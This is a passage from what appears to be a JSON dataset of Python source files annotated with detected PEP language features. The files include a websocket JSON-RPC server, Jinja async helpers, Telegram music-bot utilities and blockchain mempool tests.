                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import List, Tuple, Dict, Callable, Any, Optional, Union",
                        "suggestion"
                    ],
                    [
                        3,
                        "from typing import List, Tuple, Dict, Callable, Any, Optional, Union",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        14,
                        "_DISABLED: List[str] = []",
                        "violation"
                    ],
                    [
                        15,
                        "_UNLOADED: List[str] = []",
                        "violation"
                    ],
                    [
                        16,
                        "def _init(name: str) -> Tuple[bool, bool]:",
                        "violation"
                    ],
                    [
                        63,
                        "                 scope: List[str],",
                        "violation"
                    ],
                    [
                        104,
                        "    def _parse(allow_private: bool,",
                        "violation"
                    ],
                    [
                        111,
                        "        kwargs['scope']: List[str] = []",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        26,
                        27,
                        "async for",
                        "async for flt in _DISABLED_FILTERS.find():\n        _DISABLED.append(flt['filter'])"
                    ],
                    [
                        28,
                        29,
                        "async for",
                        "async for flt in _UNLOADED_FILTERS.find():\n        _UNLOADED.append(flt['filter'])"
                    ]
                ],
                "pep_498": [
                    [
                        126,
                        "        return f\"<filter {self.name}>\""
                    ],
                    [
                        142,
                        "            self.name = f\"{func.__module__.split('.')[-1]}.{func.__name__}\""
                    ],
                    [
                        146,
                        "        _LOG.debug(_LOG_STR, f\"updated {self}\")"
                    ],
                    [
                        152,
                        "        _LOG.debug(_LOG_STR, f\"enabled {self}\")"
                    ],
                    [
                        159,
                        "        _LOG.debug(_LOG_STR, f\"disabled {self}\")"
                    ],
                    [
                        169,
                        "        _LOG.debug(_LOG_STR, f\"loaded {self}\")"
                    ],
                    [
                        179,
                        "        _LOG.debug(_LOG_STR, f\"unloaded {self}\")"
                    ]
                ]
            }
        },
        "70": {
            "file": "import os\nimport json\nimport asyncio\nimport websockets\nfrom websockets import exceptions\nfrom jsonrpc import JSONRPCResponseManager, dispatcher\nclients = set()\napp_conf = {}\ndef config():\n    app_config = {\n        \"host\": None,\n        \"port\": 8765\n    }\n    if 'WSS_HOST' in os.environ:\n        app_config[\"host\"] = os.environ['WSS_HOST']\n    if 'WSS_PORT' in os.environ:\n        app_config[\"port\"] = os.environ['WSS_PORT']\n    return app_config\nasync def broadcast(message, **kwargs):\n    clients_copy = clients.copy()\n    for websocket in clients_copy:\n        try:\n            await websocket.send(message)\n        except websockets.ConnectionClosed:\n            clients.remove(websocket)\n@dispatcher.add_method\ndef send_echo(message):\n    return {\"message\": message}\n@dispatcher.add_method\ndef send_message(ids, message):\n    asyncio.get_event_loop().create_task(\n        broadcast(\n            json.dumps({\"message\": message})\n        )\n    )\n    return True\nasync def consume(message, request_websocket):\n    await request_websocket.send(json.dumps(JSONRPCResponseManager.handle(message, dispatcher).data))\nasync def handler(websocket, path):\n    clients.add(websocket)\n    try:\n        async for message in websocket:\n            await consume(message, websocket)\n    except websockets.exceptions.ConnectionClosedError:\n        clients.remove(websocket)\nasync def main():\n    async with websockets.serve(handler, app_conf[\"host\"], app_conf[\"port\"]):\n        await asyncio.Future()\nif __name__ == '__main__':\n    app_conf = config()\n    print(f\"Running at {app_conf['host']} on {app_conf['port']}\")\n    asyncio.run(main())",
            "patterns": {
                "pep_567": [
                    [
                        3,
                        3,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        42,
                        43,
                        "async for",
                        "async for message in websocket:\n            await consume(message, websocket)"
                    ]
                ],
                "pep_498": [
                    [
                        51,
                        "    print(f\"Running at {app_conf['host']} on {app_conf['port']}\")"
                    ]
                ]
            }
        },
        "71": {
            "file": "import asyncio\nimport inspect\nfrom functools import update_wrapper\nfrom .environment import TemplateModule\nfrom .runtime import LoopContext\nfrom .utils import concat\nfrom .utils import internalcode\nfrom .utils import Markup\nfrom .utils import missing\nasync def concat_async(async_gen):\n    rv = []\n    async def collect():\n        async for event in async_gen:\n            rv.append(event)\n    await collect()\n    return concat(rv)\nasync def generate_async(self, *args, **kwargs):\n    vars = dict(*args, **kwargs)\n    try:\n        async for event in self.root_render_func(self.new_context(vars)):\n            yield event\n    except Exception:\n        yield self.environment.handle_exception()\ndef wrap_generate_func(original_generate):\n    def _convert_generator(self, loop, args, kwargs):\n        async_gen = self.generate_async(*args, **kwargs)\n        try:\n            while 1:\n                yield loop.run_until_complete(async_gen.__anext__())\n        except StopAsyncIteration:\n            pass\n    def generate(self, *args, **kwargs):\n        if not self.environment.is_async:\n            return original_generate(self, *args, **kwargs)\n        return _convert_generator(self, asyncio.get_event_loop(), args, kwargs)\n    return update_wrapper(generate, original_generate)\nasync def render_async(self, *args, **kwargs):\n    if not self.environment.is_async:\n        raise RuntimeError(\"The environment was not created with async mode enabled.\")\n    vars = dict(*args, **kwargs)\n    ctx = self.new_context(vars)\n    try:\n        return await concat_async(self.root_render_func(ctx))\n    except Exception:\n        return self.environment.handle_exception()\ndef wrap_render_func(original_render):\n    def render(self, *args, **kwargs):\n        if not self.environment.is_async:\n            return original_render(self, *args, **kwargs)\n        loop = asyncio.get_event_loop()\n        return loop.run_until_complete(self.render_async(*args, **kwargs))\n    return update_wrapper(render, original_render)\ndef wrap_block_reference_call(original_call):\n    @internalcode\n    async def async_call(self):\n        rv = await concat_async(self._stack[self._depth](self._context))\n        if self._context.eval_ctx.autoescape:\n            rv = Markup(rv)\n        return rv\n    @internalcode\n    def __call__(self):\n        if not self._context.environment.is_async:\n            return original_call(self)\n        return async_call(self)\n    return update_wrapper(__call__, original_call)\ndef wrap_macro_invoke(original_invoke):\n    @internalcode\n    async def async_invoke(self, arguments, autoescape):\n        rv = await self._func(*arguments)\n        if autoescape:\n            rv = Markup(rv)\n        return rv\n    @internalcode\n    def _invoke(self, arguments, autoescape):\n        if not self._environment.is_async:\n            return original_invoke(self, arguments, autoescape)\n        return async_invoke(self, arguments, autoescape)\n    return update_wrapper(_invoke, original_invoke)\n@internalcode\nasync def get_default_module_async(self):\n    if self._module is not None:\n        return self._module\n    self._module = rv = await self.make_module_async()\n    return rv\ndef wrap_default_module(original_default_module):\n    @internalcode\n    def _get_default_module(self):\n        if self.environment.is_async:\n            raise RuntimeError(\"Template module attribute is unavailable in async mode\")\n        return original_default_module(self)\n    return _get_default_module\nasync def make_module_async(self, vars=None, shared=False, locals=None):\n    context = self.new_context(vars, shared, locals)\n    body_stream = []\n    async for item in self.root_render_func(context):\n        body_stream.append(item)\n    return TemplateModule(self, context, body_stream)\ndef patch_template():\n    from . import Template\n    Template.generate = wrap_generate_func(Template.generate)\n    Template.generate_async = update_wrapper(generate_async, Template.generate_async)\n    Template.render_async = update_wrapper(render_async, Template.render_async)\n    Template.render = wrap_render_func(Template.render)\n    Template._get_default_module = wrap_default_module(Template._get_default_module)\n    Template._get_default_module_async = get_default_module_async\n    Template.make_module_async = update_wrapper(\n        make_module_async, Template.make_module_async\n    )\ndef patch_runtime():\n    from .runtime import BlockReference, Macro\n    BlockReference.__call__ = wrap_block_reference_call(BlockReference.__call__)\n    Macro._invoke = wrap_macro_invoke(Macro._invoke)\ndef patch_filters():\n    from .filters import FILTERS\n    from .asyncfilters import ASYNC_FILTERS\n    FILTERS.update(ASYNC_FILTERS)\ndef patch_all():\n    patch_template()\n    patch_runtime()\n    patch_filters()\nasync def auto_await(value):\n    if inspect.isawaitable(value):\n        return await value\n    return value\nasync def auto_aiter(iterable):\n    if hasattr(iterable, \"__aiter__\"):\n        async for item in iterable:\n            yield item\n        return\n    for item in iterable:\n        yield item\nclass AsyncLoopContext(LoopContext):\n    _to_iterator = staticmethod(auto_aiter)\n    @property\n    async def length(self):\n        if self._length is not None:\n            return self._length\n        try:\n            self._length = len(self._iterable)\n        except TypeError:\n            iterable = [x async for x in self._iterator]\n            self._iterator = self._to_iterator(iterable)\n            self._length = len(iterable) + self.index + (self._after is not missing)\n        return self._length\n    @property\n    async def revindex0(self):\n        return await self.length - self.index\n    @property\n    async def revindex(self):\n        return await self.length - self.index0\n    async def _peek_next(self):\n        if self._after is not missing:\n            return self._after\n        try:\n            self._after = await self._iterator.__anext__()\n        except StopAsyncIteration:\n            self._after = missing\n        return self._after\n    @property\n    async def last(self):\n        return await self._peek_next() is missing\n    @property\n    async def nextitem(self):\n        rv = await self._peek_next()\n        if rv is missing:\n            return self._undefined(\"there is no next item\")\n        return rv\n    def __aiter__(self):\n        return self\n    async def __anext__(self):\n        if self._after is not missing:\n            rv = self._after\n            self._after = missing\n        else:\n            rv = await self._iterator.__anext__()\n        self.index0 += 1\n        self._before = self._current\n        self._current = rv\n        return rv, self\nasync def make_async_loop_context(iterable, undefined, recurse=None, depth0=0):\n    import warnings\n    warnings.warn(\n        \"This template must be recompiled with at least Jinja 2.11, or\"\n        \" it will fail in 3.0.\",\n        DeprecationWarning,\n        stacklevel=2,\n    )\n    return AsyncLoopContext(iterable, undefined, recurse, depth0)\npatch_all()",
            "patterns": {
                "pep_468": [
                    [
                        18,
                        "dict(*args, **kwargs)"
                    ],
                    [
                        26,
                        "self.generate_async(*args, **kwargs)"
                    ],
                    [
                        34,
                        "original_generate(self, *args, **kwargs)"
                    ],
                    [
                        40,
                        "dict(*args, **kwargs)"
                    ],
                    [
                        49,
                        "original_render(self, *args, **kwargs)"
                    ],
                    [
                        51,
                        "self.render_async(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_530": [
                    [
                        141,
                        "iterable = [x async for x in self._iterator]"
                    ]
                ],
                "pep_525": [
                    [
                        17,
                        23,
                        "async generator",
                        "async def generate_async(self, *args, **kwargs):\n    vars = dict(*args, **kwargs)\n    try:\n        async for event in self.root_render_func(self.new_context(vars)):\n            yield event\n    except Exception:\n        yield self.environment.handle_exception()"
                    ],
                    [
                        125,
                        131,
                        "async generator",
                        "async def auto_aiter(iterable):\n    if hasattr(iterable, \"__aiter__\"):\n        async for item in iterable:\n            yield item\n        return\n    for item in iterable:\n        yield item"
                    ],
                    [
                        95,
                        96,
                        "async for",
                        "async for item in self.root_render_func(context):\n        body_stream.append(item)"
                    ],
                    [
                        13,
                        14,
                        "async for",
                        "async for event in async_gen:\n            rv.append(event)"
                    ],
                    [
                        20,
                        21,
                        "async for",
                        "async for event in self.root_render_func(self.new_context(vars)):\n            yield event"
                    ],
                    [
                        127,
                        128,
                        "async for",
                        "async for item in iterable:\n            yield item"
                    ]
                ],
                "pep_709": [
                    [
                        182,
                        182,
                        "    warnings.warn(",
                        "stacklevel warnings"
                    ]
                ]
            }
        },
        "72": {
            "file": "import asyncio\nimport glob\nimport random\nimport string\nimport shutil\nimport traceback\nfrom asyncio import sleep, TimeoutError\nfrom collections import namedtuple\nfrom datetime import date\nfrom functools import wraps\nfrom time import time\nfrom hashlib import sha256\nfrom contextlib import suppress\nimport aiofiles\nimport aiohttp\nfrom mutagen.flac import FLAC, Picture\nfrom aiogram import exceptions, types\nfrom eyed3.id3 import Tag\nfrom yarl import URL\nfrom var import var\nimport config\ndef sign(args):\n    sign_str = ':'.join(str(arg) for arg in args) + config.request_sign\n    sha256(sign_str.encode('ascii'))\ndef check_sign(data: dict):\n    input_sign = data.pop('sign', None)\n    return sign(data.values(), config.request_sign) == input_sign\ndef print_traceback(exc):\n    print(''.join(traceback.format_tb(exc.__traceback__)))\nasync def query_answer(query, *args, **kwargs):\n    try:\n        await query.answer(*args, **kwargs)\n    except exceptions.InvalidQueryID as exc:\n        print(exc)\ndef new_callback(*args, sep=\":\"):\n    return sep.join(str(arg) for arg in args)\ndef parse_callback(callback, sep=\":\"):\n    return callback.split(sep)\ndef random_string(length=10):\n    return \"\".join(random.sample(string.ascii_letters, length))\ndef clear_link(message):\n    for entity in message.entities:\n        if entity.type == \"url\":\n            return (\n                entity.url or\n                message.text[entity.offset: entity.offset + entity.length]\n            )\ndef split_string(text, divider=\"\\n\"):\n    result = []\n    words = text.split(divider)\n    string = \"\"\n    for i, word in enumerate(words):\n        if len(string + word) > 4096:\n            result.append(string)\n            string = \"\"\n        string += word + divider\n        if i == len(words) - 1:\n            result.append(string)\n            string = \"\"\n    return result\ndef already_downloading(track_id):\n    status = var.downloading.get(track_id)  \n    if status is None or int(time()) - status > 60:\n        return False\n    return True\ndef donated_user(user_id):\n    return user_id in config.admins or user_id in config.donated_users\ndef islink(text):\n    return \"https://\" in text or \"http://\" in text\nStats = namedtuple(\"Stats\", (\"downloaded_tracks\",\n                             \"sent_tracks\", \"received_messages\"))\ndef get_today_stats():\n    datestr = date.today().isoformat()\n    downloaded_tracks = 0\n    sent_tracks = 0\n    received_messages = 0\n    for filename in glob.iglob(f\"logs/{datestr}/*file_downloads.log\"):\n        downloaded_tracks += sum(1 for line in open(filename))\n    for filename in glob.iglob(f\"logs/{datestr}/*sent_messages.log\"):\n        sent_tracks += sum(1 for line in open(filename))\n    for filename in glob.iglob(f\"logs/{datestr}/*messages.log\"):\n        received_messages += sum(1 for line in open(filename))\n    return Stats(downloaded_tracks, sent_tracks, received_messages)\ndef encode_url(url, *args, **kwargs):\n    data = {}\n    for arg in args:\n        if isinstance(arg, dict):\n            data.update(arg)\n    data.update(kwargs)\n    url = URL(url).with_query(data)\n    return str(url)\ndef calling_queue(size):\n    def wrapper(coro):\n        sem = asyncio.Semaphore(size)\n        @wraps(coro)\n        async def decorator(*args, **kwargs):\n            async with sem:\n                try:\n                    result = await asyncio.wait_for(coro(*args, **kwargs), 100)\n                except TimeoutError as exc:\n                    print_traceback(exc)\n                else:\n                    return result\n        return decorator\n    return wrapper\nasync def download_file(url, path):\n    r = await request_get(url)\n    async with aiofiles.open(path, \"wb\") as f:\n        async for chunk in r.content.iter_chunked(2048):\n            await f.write(chunk)\n    return path\nasync def get_file(url):\n    r = await request_get(url)\n    return await r.content.read()\nasync def get_album_cover_url(album_id, res='1000x1000'):\n    r = await request_get(f\"https://api.deezer.com/album/{album_id}/image\")\n    return str(r.url).replace(\"120x120\", res)\ndef add_tags(path, track, album, image, lyrics):\n    try:\n        genre = album[\"genres\"][\"data\"][0][\"name\"]\n    except (KeyError, IndexError):\n        genre = \"\"\n    tags = {\n        'artist': track[\"artist\"][\"name\"],\n        'album': track[\"album\"][\"title\"],\n        'album_artist': album[\"artist\"][\"name\"],\n        'original_release_date': track[\"album\"][\"release_date\"],\n        'recording_date': int(track[\"album\"][\"release_date\"].split(\"-\")[0]),\n        'title': track[\"title\"],\n        'track_num': track[\"track_position\"],\n        'disc_num': track[\"disk_number\"],\n        'non_std_genre': genre,\n        'bpm': track[\"bpm\"]\n    }\n    if path.endswith('mp3'):\n        add_mp3_tags(path, tags, image, lyrics, image_mimetype='image/jpg')\n    elif path.endswith('flac'):\n        add_flac_tags(path, tags, image, lyrics, image_mimetype='image/jpg')\ndef sc_add_tags(path, track, image, lyrics=None):\n    try:\n        album_title = track[\"publisher_metadata\"][\"album_title\"]\n    except KeyError:\n        album_title = \"\"\n    tags = {\n        'title': track.title,\n        'artist': track.artist,\n        'album': album_title,\n        'album_artist': track.artist if album_title else \"\",\n        'album_title': album_title,\n        'original_release_date': (\n            track.created_at.split(\"T\")[0].split(\" \")[0].replace(\"/\", \"-\")),\n        'non_std_genre': track.get(\"genre\", \"\"),\n    }\n    add_mp3_tags(path, tags, image, lyrics)\ndef vk_add_tags(path, track, image=None):\n    tags = {\n        'title': track.title,\n        'artist': track.artist,\n    }\n    if track.album:\n        tags.update({'album': track.album.title})\n    add_mp3_tags(path, tags, image, image_mimetype='image/jpg')\ndef add_mp3_tags(path, tags, image, lyrics=None, image_mimetype='image/png'):\n    tag = Tag()\n    tag.parse(path)\n    for key, val in tags.items():\n        try:\n            setattr(tag, key, val)\n        except Exception as e:\n            print(e)\n    if lyrics:\n        tag.lyrics.set(lyrics)\n    if image:\n        tag.images.set(type_=3, img_data=image, mime_type=image_mimetype)\n    tag.save(encoding='utf-8')\ndef add_flac_tags(path, tags, image, lyrics=None, image_mimetype='image/jpg'):\n    tag = FLAC(path)\n    pic = Picture()\n    pic.data = image\n    pic.type = 3\n    pic.mime = image_mimetype\n    tag.add_picture(pic)\n    for key, val in tags.items():\n        try:\n            tag[key] = str(val)\n        except Exception as e:\n            print(e)\n    tag.save()\nerrcount = {\"count\": 0}\nasync def request_get(url, params=None, json=None, *args, **kwargs):\n    retries_count = 0\n    while True:\n        try:\n            result = await var.session.get(\n                url, params=params, json=json, *args, **kwargs)\n        except TimeoutError:\n            if errcount[\"count\"] > 3:\n                exit(1)\n            await var.session.close()\n            var.session = aiohttp.ClientSession(raise_for_status=True)\n            errcount[\"count\"] += 1\n        except Exception as err:\n            retries_count += 1\n            if retries_count > 3:\n                print(\n                    f'url=\\n{url}\\nparams={params}\\n'\n                    f'args={args}\\nkwargs={kwargs}')\n                print_traceback(err)\n                raise ValueError(\"Number of retries exceeded\") from err\n        else:\n            return result\nasync def request_post(url, *args, **kwargs):\n    retries_count = 0\n    while True:\n        try:\n            result = await var.session.post(url, *args, **kwargs)\n        except TimeoutError:\n            if errcount[\"count\"] > 3:\n                exit(1)\n            await var.session.close()\n            var.session = aiohttp.ClientSession()\n            errcount[\"count\"] += 1\n        except Exception as err:\n            retries_count += 1\n            if retries_count > 3:\n                print(\n                    f'url=\\n{url}\\nargs={args}\\nkwargs={kwargs}')\n                raise ValueError(\"Number of retries exceeded\") from err\n        else:\n            return result\n@calling_queue(3)\nasync def upload_track(bot, path, title, performer, duration=None, tries=0):\n    if tries > 3:\n        raise RuntimeError(\"can't upload track\")\n    try:\n        msg = await bot.send_audio(\n            chat_id=-1001246220493,\n            audio=types.InputFile(path),\n            title=title,\n            performer=performer,\n            duration=duration,\n        )\n    except exceptions.RetryAfter as e:\n        print(f\"flood control exceeded, sleeping for {e.timeout + 10} seconds\")\n        await sleep(e.timeout + 10)\n        return await upload_track(\n            bot, path, title, performer, duration, tries + 1)\n    except exceptions.TelegramAPIError:\n        await sleep(5)\n        return await upload_track(\n            bot, path, title, performer, duration, tries + 1)\n    return msg\nasync def answer_empty_inline_query(query: types.InlineQuery, text: str):\n    if not text:\n        return await query.answer(\n            results=[],\n            switch_pm_text='Search',\n            switch_pm_parameter='0')\n    elif query.offset == 'done':\n        return await query.answer(results=[])\n    else:\n        return False\n    return True\nasync def delete_later(path: str, delay: int = 100):\n    await asyncio.sleep(delay)\n    with suppress(FileNotFoundError):\n        shutil.rmtree(path.rsplit('/', 1)[0])",
            "patterns": {
                "pep_468": [
                    [
                        32,
                        "query.answer(*args, **kwargs)"
                    ],
                    [
                        99,
                        "coro(*args, **kwargs)"
                    ],
                    [
                        194,
                        "var.session.get(\n                url, params=params, json=json, *args, **kwargs)"
                    ],
                    [
                        216,
                        "var.session.post(url, *args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        7,
                        7,
                        "import",
                        "from asyncio import sleep, TimeoutError"
                    ]
                ],
                "pep_525": [
                    [
                        109,
                        110,
                        "async for",
                        "async for chunk in r.content.iter_chunked(2048):\n            await f.write(chunk)"
                    ]
                ],
                "pep_498": [
                    [
                        77,
                        "    for filename in glob.iglob(f\"logs/{datestr}/*file_downloads.log\"):"
                    ],
                    [
                        79,
                        "    for filename in glob.iglob(f\"logs/{datestr}/*sent_messages.log\"):"
                    ],
                    [
                        81,
                        "    for filename in glob.iglob(f\"logs/{datestr}/*messages.log\"):"
                    ],
                    [
                        116,
                        "    r = await request_get(f\"https://api.deezer.com/album/{album_id}/image\")"
                    ],
                    [
                        244,
                        "        print(f\"flood control exceeded, sleeping for {e.timeout + 10} seconds\")"
                    ],
                    [
                        206,
                        "                    f'url=\\n{url}\\nparams={params}\\n'"
                    ],
                    [
                        227,
                        "                    f'url=\\n{url}\\nargs={args}\\nkwargs={kwargs}')"
                    ]
                ]
            }
        },
        "73": {
            "file": "import asyncio\nimport logging\nfrom typing import Dict, List, Optional, Tuple, Callable\nimport pytest\nfrom clvm import SExp\nfrom clvm.EvalError import EvalError\nimport taco.server.ws_connection as ws\nfrom taco.full_node.mempool import Mempool\nfrom taco.full_node.full_node_api import FullNodeAPI\nfrom taco.protocols import full_node_protocol\nfrom taco.simulator.simulator_protocol import FarmNewBlockProtocol\nfrom taco.types.announcement import Announcement\nfrom taco.types.blockchain_format.coin import Coin\nfrom taco.types.coin_solution import CoinSolution\nfrom taco.types.condition_opcodes import ConditionOpcode\nfrom taco.types.condition_with_args import ConditionWithArgs\nfrom taco.types.spend_bundle import SpendBundle\nfrom taco.util.clvm import int_to_bytes\nfrom taco.util.condition_tools import conditions_for_solution\nfrom taco.util.errors import Err, ValidationError\nfrom taco.util.ints import uint64\nfrom taco.util.hash import std_hash\nfrom taco.types.mempool_inclusion_status import MempoolInclusionStatus\nfrom taco.util.api_decorators import api_request, peer_required, bytes_required\nfrom taco.full_node.mempool_check_conditions import parse_condition_args\nfrom tests.connection_utils import connect_and_get_peer\nfrom tests.core.node_height import node_height_at_least\nfrom tests.setup_nodes import bt, setup_simulators_and_wallets\nfrom tests.time_out_assert import time_out_assert\nfrom taco.types.blockchain_format.program import Program, INFINITE_COST\nfrom taco.consensus.condition_costs import ConditionCost\nBURN_PUZZLE_HASH = b\"0\" * 32\nBURN_PUZZLE_HASH_2 = b\"1\" * 32\nWALLET_A = bt.get_pool_wallet_tool()\nlog = logging.getLogger(__name__)\ndef generate_test_spend_bundle(\n    coin: Coin,\n    condition_dic: Dict[ConditionOpcode, List[ConditionWithArgs]] = None,\n    fee: uint64 = uint64(0),\n    amount: uint64 = uint64(1000),\n    new_puzzle_hash=BURN_PUZZLE_HASH,\n) -> SpendBundle:\n    if condition_dic is None:\n        condition_dic = {}\n    transaction = WALLET_A.generate_signed_transaction(amount, new_puzzle_hash, coin, condition_dic, fee)\n    assert transaction is not None\n    return transaction\n@pytest.fixture(scope=\"module\")\ndef event_loop():\n    loop = asyncio.get_event_loop()\n    yield loop\n@pytest.fixture(scope=\"module\")\nasync def two_nodes():\n    async_gen = setup_simulators_and_wallets(2, 1, {})\n    nodes, _ = await async_gen.__anext__()\n    full_node_1 = nodes[0]\n    full_node_2 = nodes[1]\n    server_1 = full_node_1.full_node.server\n    server_2 = full_node_2.full_node.server\n    yield full_node_1, full_node_2, server_1, server_2\n    async for _ in async_gen:\n        yield _\nclass TestMempool:\n    @pytest.mark.asyncio\n    async def test_basic_mempool(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        blocks = bt.get_consecutive_blocks(\n            3,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, _, server_1, _ = two_nodes\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, blocks[-1].height)\n        max_mempool_cost = 40000000 * 5\n        mempool = Mempool(max_mempool_cost)\n        assert mempool.get_min_fee_rate(104000) == 0\n        with pytest.raises(ValueError):\n            mempool.get_min_fee_rate(max_mempool_cost + 1)\n        spend_bundle = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle is not None\n@peer_required\n@api_request\n@bytes_required\nasync def respond_transaction(\n    node: FullNodeAPI,\n    tx: full_node_protocol.RespondTransaction,\n    peer: ws.WSTacoConnection,\n    tx_bytes: bytes = b\"\",\n    test: bool = False,\n) -> Tuple[MempoolInclusionStatus, Optional[Err]]:\n    assert tx_bytes != b\"\"\n    spend_name = std_hash(tx_bytes)\n    if spend_name in node.full_node.full_node_store.pending_tx_request:\n        node.full_node.full_node_store.pending_tx_request.pop(spend_name)\n    if spend_name in node.full_node.full_node_store.peers_with_tx:\n        node.full_node.full_node_store.peers_with_tx.pop(spend_name)\n    return await node.full_node.respond_transaction(tx.transaction, spend_name, peer, test)\nclass TestMempoolManager:\n    @pytest.mark.asyncio\n    async def test_basic_mempool_manager(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        blocks = bt.get_consecutive_blocks(\n            5,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_2, blocks[-1].height)\n        spend_bundle = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle is not None\n        tx: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle)\n        res = await full_node_1.respond_transaction(tx, peer)\n        log.info(f\"Res {res}\")\n        await time_out_assert(\n            10,\n            full_node_1.full_node.mempool_manager.get_spendbundle,\n            spend_bundle,\n            spend_bundle.name(),\n        )\n    @pytest.mark.asyncio\n    async def test_double_spend(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        spend_bundle1 = generate_test_spend_bundle(list(blocks[-1].get_included_reward_coins())[0])\n        assert spend_bundle1 is not None\n        tx1: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle1)\n        status, err = await respond_transaction(full_node_1, tx1, peer)\n        assert status == MempoolInclusionStatus.SUCCESS\n        assert err is None\n        spend_bundle2 = generate_test_spend_bundle(\n            list(blocks[-1].get_included_reward_coins())[0],\n            new_puzzle_hash=BURN_PUZZLE_HASH_2,\n        )\n        assert spend_bundle2 is not None\n        tx2: full_node_protocol.RespondTransaction = full_node_protocol.RespondTransaction(spend_bundle2)\n        status, err = await respond_transaction(full_node_1, tx2, peer)\n        sb1 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle1.name())\n        sb2 = full_node_1.full_node.mempool_manager.get_spendbundle(spend_bundle2.name())\n        assert sb1 == spend_bundle1\n        assert sb2 is None\n        assert status == MempoolInclusionStatus.PENDING\n        assert err == Err.MEMPOOL_CONFLICT\n    async def send_sb(self, node, peer, sb):\n        tx = full_node_protocol.RespondTransaction(sb)\n        await node.respond_transaction(tx, peer)\n    async def gen_and_send_sb(self, node, peer, *args, **kwargs):\n        sb = generate_test_spend_bundle(*args, **kwargs)\n        assert sb is not None\n        await self.send_sb(node, peer, sb)\n        return sb\n    def assert_sb_in_pool(self, node, sb):\n        assert sb == node.full_node.mempool_manager.get_spendbundle(sb.name())\n    def assert_sb_not_in_pool(self, node, sb):\n        assert node.full_node.mempool_manager.get_spendbundle(sb.name()) is None\n    @pytest.mark.asyncio\n    async def test_double_spend_with_higher_fee(self, two_nodes):\n        reward_ph = WALLET_A.get_new_puzzlehash()\n        full_node_1, full_node_2, server_1, server_2 = two_nodes\n        blocks = await full_node_1.get_all_full_blocks()\n        start_height = blocks[-1].height\n        blocks = bt.get_consecutive_blocks(\n            3,\n            block_list_input=blocks,\n            guarantee_transaction_block=True,\n            farmer_reward_puzzle_hash=reward_ph,\n            pool_reward_puzzle_hash=reward_ph,\n        )\n        peer = await connect_and_get_peer(server_1, server_2)\n        for block in blocks:\n            await full_node_1.full_node.respond_block(full_node_protocol.RespondBlock(block))\n        await time_out_assert(60, node_height_at_least, True, full_node_1, start_height + 3)\n        coins = iter(blocks[-1].get_included_reward_coins())\n        coin1, coin2 = next(coins), next(coins)\n        coins = iter(blocks[-2].get_included_reward_coins())\n        coin3, coin4 = next(coins), next(coins)\n        sb1_1 = await self.gen_and_send_sb(full_node_1, peer, coin1)\n        sb1_2 = await self.gen_and_send_sb(full_node_1, peer, coin1, fee=uint64(1))\n        self.assert_sb_in_pool(full_node_1, sb1_1)\n        self.assert_sb_not_in_pool(full_node_1, sb1_2)\n        min_fee_increase = full_node_1.full_node.mempool_manager.get_min_fee_increase()\n        sb1_3 = await self.gen_and_send_sb(full_node_1, peer, coin1, fee=uint64(min_fee_increase))\n        self.assert_sb_not_in_pool(full_node_1, sb1_1)\n        self.assert_sb_in_pool(full_node_1, sb1_3)\n        sb2 = generate_test_spend_bundle(coin2, fee=uint64(min_fee_increase))\n        sb12 = SpendBundle.aggregate((sb2, sb1_3))\n        await self.send_sb(full_node_1, peer, sb12)\n        self.assert_sb_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb1_3)\n        sb3 = generate_test_spend_bundle(coin3, fee=uint64(min_fee_increase * 2))\n        sb23 = SpendBundle.aggregate((sb2, sb3))\n        await self.send_sb(full_node_1, peer, sb23)\n        self.assert_sb_in_pool(full_node_1, sb12)\n        self.assert_sb_not_in_pool(full_node_1, sb23)\n        await self.send_sb(full_node_1, peer, sb3)\n        self.assert_sb_in_pool(full_node_1, sb3)\n        sb4_1 = generate_test_spend_bundle(coin4, fee=uint64(min_fee_increase))\n        sb1234_1 = SpendBundle.aggregate((sb12, sb3, sb4_1))\n        await self.send_sb(full_node_1, peer, sb1234_1)\n        self.assert_sb_not_in_pool(full_node_1, sb1234_1)\n        sb4_2 = generate_test_spend_bundle(coin4, fee=uint64(min_fee_increase * 2))\n        sb1234_2 = SpendBundle.aggregate((sb12, sb3, sb4_2))\n        await self.send_sb(full_node_1, peer, sb1234_2)\n        self.assert_sb_in_pool(full_node_1, sb1234_2)\n        